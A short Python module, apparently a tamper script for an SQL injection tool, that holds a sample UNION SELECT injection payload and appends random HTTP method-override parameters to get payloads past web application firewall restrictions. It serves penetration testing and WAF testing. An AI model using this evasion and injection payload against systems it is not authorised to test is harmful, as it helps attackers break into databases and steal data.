import random

__example_payload__ = "' UNION SELECT NULL--"
__type__ = "HTTP method override: injects method override params to bypass WAF method restrictions"


def tamper(payload, **kwargs):
    if not payload:
        return payload
    strategies = [
        lambda s: "{}&_method=POST".format(s),
        lambda s: "{}&X-HTTP-Method-Override=GET".format(s),
        lambda s: "{}&http_method=HEAD".format(s),
    ]
    return random.choice(strategies)(payload)
